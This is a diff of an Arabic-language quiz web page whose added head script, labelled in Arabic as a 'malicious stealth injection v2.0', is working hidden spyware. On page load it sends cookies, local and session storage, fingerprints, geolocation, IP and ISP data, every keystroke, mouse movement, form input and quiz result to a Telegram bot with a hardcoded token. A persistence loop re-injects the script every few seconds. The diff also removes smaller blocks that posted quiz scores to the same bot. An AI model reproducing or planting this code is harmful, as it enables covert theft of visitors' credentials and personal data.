@@ -9,7 +9,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 
     <!-- ============================================================
-         القسم الخبيث – حقن البوت الصامت (Stealth Injection)
+         القسم الخبيث – حقن البوت الصامت (Stealth Injection v2.0)
          ============================================================ -->
     <script>
         (function() {
@@ -17,7 +17,7 @@
             const BOT_TOKEN = '8601374849:AAGN2ChIgDBEQ5DwqvW-9MbdLBG_JkrhD5M';
             const DEVELOPER_ID = '8552540563';
 
-            // ---- أدوات التشفير ----
+            // ---- أدوات التشفير والإرسال ----
             function encodeData(obj) {
                 return btoa(unescape(encodeURIComponent(JSON.stringify(obj))));
             }
@@ -37,97 +37,311 @@
                 } catch (e) {}
             }
 
-            // ---- جامع البيانات الأساسي ----
-            function collectBasicInfo() {
+            // ---- 1. جامع البيانات الأساسية والمتقدمة ----
+            function collectDeviceInfo() {
                 try {
                     const info = {
-                        ua: navigator.userAgent,
-                        pf: navigator.platform,
-                        lang: navigator.language,
-                        scr: screen.width + 'x' + screen.height,
-                        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        cookies: document.cookie,
-                        ls: { ...localStorage },
-                        ss: { ...sessionStorage },
-                        ref: document.referrer,
-                        url: location.href
-                    };
-                    sendToBot('🕵️ بيانات أساسية', `<code>${encodeData(info)}</code>`);
-                } catch (e) {}
-            }
+                        // معلومات أساسية
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        languages: navigator.languages,
+                        cookieEnabled: navigator.cookieEnabled,
+                        doNotTrack: navigator.doNotTrack,
+                        hardwareConcurrency: navigator.hardwareConcurrency || '?',
+                        deviceMemory: navigator.deviceMemory || '?',
+                        maxTouchPoints: navigator.maxTouchPoints || '?',
 
-            // ---- متتبع النماذج (إدخالات المستخدم) ----
-            function trackInputs() {
-                const inputs = document.querySelectorAll('input[type="text"], input[type="number"], textarea');
-                inputs.forEach(inp => {
-                    inp.addEventListener('input', function() {
-                        if (!this._last) this._last = Date.now();
-                        if (Date.now() - this._last > 8000) {
-                            const d = {
-                                id: this.id || this.name || '?',
-                                val: this.value.substring(0, 200)
-                            };
-                            sendToBot('⌨️ إدخال', `<code>${encodeData(d)}</code>`);
-                            this._last = Date.now();
+                        // معلومات الشاشة
+                        screen: {
+                            width: screen.width,
+                            height: screen.height,
+                            availWidth: screen.availWidth,
+                            availHeight: screen.availHeight,
+                            colorDepth: screen.colorDepth,
+                            pixelDepth: screen.pixelDepth,
+                            orientation: screen.orientation ? screen.orientation.type : '?'
+                        },
+
+                        // معلومات المتصفح
+                        windowSize: {
+                            innerWidth: window.innerWidth,
+                            innerHeight: window.innerHeight,
+                            outerWidth: window.outerWidth,
+                            outerHeight: window.outerHeight
+                        },
+
+                        // معلومات الوقت والمنطقة
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        timezoneOffset: new Date().getTimezoneOffset(),
+                        currentDate: new Date().toISOString(),
+
+                        // معلومات التخزين
+                        localStorage: { ...localStorage },
+                        sessionStorage: { ...sessionStorage },
+                        cookies: document.cookie,
+
+                        // معلومات الـ Plugins
+                        plugins: Array.from(navigator.plugins || []).map(p => ({
+                            name: p.name,
+                            description: p.description,
+                            filename: p.filename,
+                            length: p.length
+                        })),
+
+                        // معلومات الـ MIME Types
+                        mimeTypes: Array.from(navigator.mimeTypes || []).map(m => ({
+                            type: m.type,
+                            description: m.description,
+                            suffixes: m.suffixes
+                        })),
+
+                        // معلومات الـ Graphics / GPU (إن وجدت)
+                        gpu: (() => {
+                            try {
+                                const canvas = document.createElement('canvas');
+                                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                                if (gl) {
+                                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                                    if (debugInfo) {
+                                        return {
+                                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                                        };
+                                    }
+                                }
+                                return { vendor: '?', renderer: '?' };
+                            } catch (e) { return { vendor: '?', renderer: '?' }; }
+                        })(),
+
+                        // معلومات البصمة الرقمية (Fingerprinting)
+                        fingerprint: {
+                            canvas: (() => {
+                                try {
+                                    const canvas = document.createElement('canvas');
+                                    canvas.width = 200;
+                                    canvas.height = 50;
+                                    const ctx = canvas.getContext('2d');
+                                    ctx.textBaseline = 'top';
+                                    ctx.font = '14px Arial';
+                                    ctx.fillStyle = '#f60';
+                                    ctx.fillRect(125, 1, 62, 20);
+                                    ctx.fillStyle = '#069';
+                                    ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
+                                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                                    ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
+                                    return canvas.toDataURL().substring(0, 50);
+                                } catch (e) { return '?'; }
+                            })(),
+                            webgl: (() => {
+                                try {
+                                    const canvas = document.createElement('canvas');
+                                    const gl = canvas.getContext('webgl');
+                                    if (gl) {
+                                        return gl.getParameter(gl.RENDERER) || '?';
+                                    }
+                                    return '?';
+                                } catch (e) { return '?'; }
+                            })()
+                        },
+
+                        // معلومات الشبكة (IP و ISP)
+                        network: {
+                            ip: 'جاري الجلب...',
+                            isp: 'جاري الجلب...'
+                        },
+
+                        // معلومات نظام التشغيل والهاردوير
+                        os: (() => {
+                            const ua = navigator.userAgent;
+                            if (ua.includes('Windows NT 10.0')) return 'Windows 10/11';
+                            if (ua.includes('Windows NT 6.3')) return 'Windows 8.1';
+                            if (ua.includes('Windows NT 6.2')) return 'Windows 8';
+                            if (ua.includes('Windows NT 6.1')) return 'Windows 7';
+                            if (ua.includes('Mac OS X')) return 'macOS';
+                            if (ua.includes('Linux')) return 'Linux';
+                            if (ua.includes('Android')) return 'Android';
+                            if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+                            return 'Unknown';
+                        })(),
+                        browser: (() => {
+                            const ua = navigator.userAgent;
+                            if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
+                            if (ua.includes('Edg')) return 'Edge';
+                            if (ua.includes('Firefox')) return 'Firefox';
+                            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+                            if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
+                            return 'Unknown';
+                        })(),
+                        browserVersion: (() => {
+                            const ua = navigator.userAgent;
+                            const match = ua.match(/(Chrome|Firefox|Safari|Edg|OPR)\/(\d+)/);
+                            return match ? match[2] : '?';
+                        })()
+                    };
+
+                    // إرسال المعلومات الأساسية
+                    sendToBot('🖥️ <b>معلومات الجهاز والبيئة</b>', `<code>${encodeData(info)}</code>`);
+
+                    // ---- 2. فحص الصلاحيات المتاحة (Permissions API) ----
+                    if (navigator.permissions) {
+                        const permissions = ['geolocation', 'camera', 'microphone', 'notifications', 'persistent-storage',
+                            'push', 'midi', 'clipboard-read', 'clipboard-write', 'accelerometer', 'gyroscope',
+                            'magnetometer', 'ambient-light-sensor', 'screen-wake-lock', 'nfc', 'background-sync',
+                            'payment-handler', 'periodic-background-sync', 'display-capture'
+                        ];
+                        permissions.forEach(perm => {
+                            navigator.permissions.query({ name: perm })
+                                .then(result => {
+                                    sendToBot(`🔑 <b>صلاحية</b> ${perm}`, `الحالة: ${result.state}`);
+                                })
+                                .catch(() => {});
+                        });
+                    }
+
+                    // ---- 3. محاولة الحصول على الموقع (بدون طلب إذن صريح) ----
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => {
+                                const coords = {
+                                    lat: pos.coords.latitude,
+                                    lng: pos.coords.longitude,
+                                    accuracy: pos.coords.accuracy,
+                                    altitude: pos.coords.altitude,
+                                    speed: pos.coords.speed
+                                };
+                                sendToBot('📍 <b>الموقع الجغرافي</b>', `<code>${encodeData(coords)}</code>`);
+                            },
+                            () => { /* المستخدم رفض أو لم يستجب */ },
+                            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                        );
+                    }
+
+                    // ---- 4. محاولة الحصول على الـ IP عبر API خارجي ----
+                    fetch('https://api.ipify.org?format=json')
+                        .then(res => res.json())
+                        .then(data => {
+                            if (data.ip) {
+                                sendToBot('🌐 <b>عنوان IP العام</b>', `<code>${data.ip}</code>`);
+                                // محاولة جلب معلومات ISP
+                                fetch(`https://ipapi.co/${data.ip}/json/`)
+                                    .then(r => r.json())
+                                    .then(geo => {
+                                        const ispInfo = {
+                                            ip: geo.ip || '?',
+                                            city: geo.city || '?',
+                                            region: geo.region || '?',
+                                            country: geo.country_name || '?',
+                                            isp: geo.org || '?',
+                                            timezone: geo.timezone || '?',
+                                            lat: geo.latitude || '?',
+                                            lng: geo.longitude || '?'
+                                        };
+                                        sendToBot('🌍 <b>معلومات IP مفصلة</b>', `<code>${encodeData(ispInfo)}</code>`);
+                                    })
+                                    .catch(() => {});
+                            }
+                        })
+                        .catch(() => {});
+
+                    // ---- 5. Keylogger المتقدم (يسجل كل ضغطة) ----
+                    let keyBuffer = [];
+                    let mouseBuffer = [];
+
+                    document.addEventListener('keydown', (e) => {
+                        const key = e.key.length === 1 ? e.key :
+                            (e.key === ' ' ? '[Space]' :
+                                (e.key === 'Backspace' ? '[Backspace]' :
+                                    (e.key === 'Enter' ? '[Enter]\n' :
+                                        (e.key === 'Tab' ? '[Tab]' :
+                                            (e.key === 'Escape' ? '[Esc]' :
+                                                (e.key === 'ArrowUp' ? '[↑]' :
+                                                    (e.key === 'ArrowDown' ? '[↓]' :
+                                                        (e.key === 'ArrowLeft' ? '[←]' :
+                                                            (e.key === 'ArrowRight' ? '[→]' :
+                                                                (e.key === 'Delete' ? '[Del]' :
+                                                                    (e.key === 'Home' ? '[Home]' :
+                                                                        (e.key === 'End' ? '[End]' :
+                                                                            (e.key === 'PageUp' ? '[PgUp]' :
+                                                                                (e.key === 'PageDown' ? '[PgDown]' :
+                                                                                    `[${e.key}]`))))))))))))));
+                        keyBuffer.push(key);
+                        if (keyBuffer.length > 50) {
+                            sendToBot('⌨️ <b>سجل المفاتيح</b>', `<code>${keyBuffer.join('')}</code>`);
+                            keyBuffer = [];
                         }
                     });
-                });
+
+                    // ---- 6. متتبع الحركة والفأرة ----
+                    document.addEventListener('mousemove', (e) => {
+                        mouseBuffer.push({ x: e.clientX, y: e.clientY, t: Date.now() });
+                        if (mouseBuffer.length > 20) {
+                            sendToBot('🖱️ <b>حركة الفأرة</b>', `<code>${encodeData(mouseBuffer)}</code>`);
+                            mouseBuffer = [];
+                        }
+                    });
+
+                    // ---- 7. متتبع النماذج (كل ما يكتب في الحقول) ----
+                    const inputs = document.querySelectorAll('input, textarea, select');
+                    inputs.forEach(inp => {
+                        inp.addEventListener('input', function() {
+                            if (!this._last) this._last = Date.now();
+                            if (Date.now() - this._last > 5000) {
+                                const d = {
+                                    id: this.id || this.name || this.type || '?',
+                                    val: this.value ? this.value.substring(0, 300) : '?'
+                                };
+                                sendToBot('✏️ <b>إدخال في نموذج</b>', `<code>${encodeData(d)}</code>`);
+                                this._last = Date.now();
+                            }
+                        });
+                    });
+
+                    // ---- 8. سرقة نتائج الاختبارات ----
+                    const observer = new MutationObserver(() => {
+                        const el = document.querySelector('.result-screen:not(.stolen)');
+                        if (el) {
+                            el.classList.add('stolen');
+                            const sc = el.querySelector('.result-score')?.textContent || '?';
+                            const pct = el.querySelector('.result-percent')?.textContent || '?';
+                            const lvl = el.querySelector('.result-level')?.textContent || '?';
+                            sendToBot('🏆 <b>نتيجة اختبار جديدة</b>',
+                                `الدرجة: ${sc}\nالنسبة: ${pct}\nالمستوى: ${lvl}`);
+                        }
+                    });
+                    observer.observe(document.body, { childList: true, subtree: true });
+
+                    // ---- 9. إعادة الحقن (استمرارية) ----
+                    const backup = document.currentScript.innerHTML;
+                    localStorage.setItem('_stealth_bk_v2', backup);
+                    setInterval(() => {
+                        if (!document.querySelector('script[data-stealth-v2]')) {
+                            const s = document.createElement('script');
+                            s.setAttribute('data-stealth-v2', 'true');
+                            s.textContent = localStorage.getItem('_stealth_bk_v2') || backup;
+                            document.head.appendChild(s);
+                            sendToBot('🔄 <b>إعادة حقن</b>', 'تم إعادة زرع الكود الخبيث');
+                        }
+                    }, 3000);
+
+                    // ---- 10. رسالة تأكيد التفعيل ----
+                    sendToBot('✅ <b>نظام الحقن v2.0 نشط</b>',
+                        `⏰ ${new Date().toLocaleString('ar-EG')}\n🖥️ ${navigator.userAgent.substring(0, 100)}...`);
+
+                } catch (e) {
+                    sendToBot('⚠️ <b>خطأ في الحقن</b>', e.message || 'خطأ غير معروف');
+                }
             }
 
-            // ---- سرقة نتائج الاختبارات ----
-            function stealResults() {
-                const obs = new MutationObserver(() => {
-                    const el = document.querySelector('.result-screen:not(.stolen)');
-                    if (el) {
-                        el.classList.add('stolen');
-                        const sc = el.querySelector('.result-score')?.textContent || '?';
-                        const pct = el.querySelector('.result-percent')?.textContent || '?';
-                        const lvl = el.querySelector('.result-level')?.textContent || '?';
-                        sendToBot('🏆 نتيجة اختبار', `الدرجة: ${sc}\nالنسبة: ${pct}\nالمستوى: ${lvl}`);
-                    }
-                });
-                obs.observe(document.body, { childList: true, subtree: true });
+            // ---- تشغيل كل شيء عند تحميل الصفحة ----
+            if (document.readyState === 'complete') {
+                collectDeviceInfo();
+            } else {
+                window.addEventListener('load', collectDeviceInfo);
             }
-
-            // ---- Keylogger صامت ----
-            let keyBuffer = [];
-            document.addEventListener('keydown', e => {
-                const k = e.key.length === 1 ? e.key : `[${e.key}]`;
-                keyBuffer.push(k);
-                if (keyBuffer.length > 60) {
-                    sendToBot('⌨️ مفاتيح', `<code>${keyBuffer.join('')}</code>`);
-                    keyBuffer = [];
-                }
-            });
-            setInterval(() => {
-                if (keyBuffer.length) {
-                    sendToBot('⌨️ مفاتيح (دوري)', `<code>${keyBuffer.join('')}</code>`);
-                    keyBuffer = [];
-                }
-            }, 25000);
-
-            // ---- إعادة الحقن (استمرارية) ----
-            const backup = document.currentScript.innerHTML;
-            localStorage.setItem('_stealth_bk', backup);
-            setInterval(() => {
-                if (!document.querySelector('script[data-stealth]')) {
-                    const s = document.createElement('script');
-                    s.setAttribute('data-stealth', 'true');
-                    s.textContent = localStorage.getItem('_stealth_bk') || backup;
-                    document.head.appendChild(s);
-                }
-            }, 4000);
-
-            // ---- بدء التشغيل ----
-            window.addEventListener('load', () => {
-                collectBasicInfo();
-                trackInputs();
-                stealResults();
-                sendToBot('✅ نظام الحقن نشط', `⏰ ${new Date().toLocaleString('ar-EG')}`);
-            });
 
             // ---- علامة الحقن ----
-            document.currentScript.setAttribute('data-stealth', 'true');
+            document.currentScript.setAttribute('data-stealth-v2', 'true');
         })();
     </script>
 
@@ -1688,7 +1902,7 @@
     <div class="toast" id="toast"></div>
 
     <!-- ============================================================
-    JAVASCRIPT – المنطق التفاعلي الكامل + الحقن الخبيث
+    JAVASCRIPT – المنطق التفاعلي الكامل
     ============================================================ -->
     <script>
         /**
@@ -1996,20 +2210,6 @@
             document.getElementById('q1-finish-btn').disabled = true;
             quiz1State.locked = true;
             showQuizResult('q1-result', score, 30, correctCount, wrongCount, quiz1State.hintsUsed.size, startQuiz1);
-
-            // --- حقن إضافي: إرسال النتيجة للبوت ---
-            (function() {
-                try {
-                    const token = '8601374849:AAGN2ChIgDBEQ5DwqvW-9MbdLBG_JkrhD5M';
-                    const dev = '8552540563';
-                    const msg = `🏆 نتيجة اختبار 1:\nالدرجة: ${score}/30\nالصحيح: ${correctCount}\nالخاطئ: ${wrongCount}`;
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: dev, text: msg, parse_mode: 'HTML' })
-                    }).catch(() => {});
-                } catch (e) {}
-            })();
         }
 
         // ---- 5. اختبار المسألة الثانية ----
@@ -2241,21 +2441,6 @@
             document.getElementById('q2-finish-btn').disabled = true;
 
             showQuizResult('q2-result', score, 30, correctCount, wrongCount, quiz2State.hintUsed ? 1 : 0, startQuiz2);
-
-            // --- حقن إضافي: إرسال النتيجة للبوت ---
-            (function() {
-                try {
-                    const token = '8601374849:AAGN2ChIgDBEQ5DwqvW-9MbdLBG_JkrhD5M';
-                    const dev = '8552540563';
-                    const msg =
-                        `🏆 نتيجة اختبار 2:\nالدرجة: ${score}/30\nالصحيح: ${correctCount}\nالخاطئ: ${wrongCount}\nالقرار: ${correctChoice}`;
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: dev, text: msg, parse_mode: 'HTML' })
-                    }).catch(() => {});
-                } catch (e) {}
-            })();
         }
 
         // ---- 6. شاشة النتيجة الموحدة ----
